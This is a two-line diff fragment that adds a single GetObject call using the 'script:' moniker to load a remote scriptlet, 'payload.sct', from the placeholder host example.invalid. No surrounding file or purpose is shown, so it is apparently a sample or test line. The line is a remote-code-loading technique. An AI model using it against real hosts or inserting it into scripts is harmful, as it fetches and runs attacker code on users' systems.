@@ -1,0 +1,2 @@
+GetObject("script:http://example.invalid/payload.sct")
+
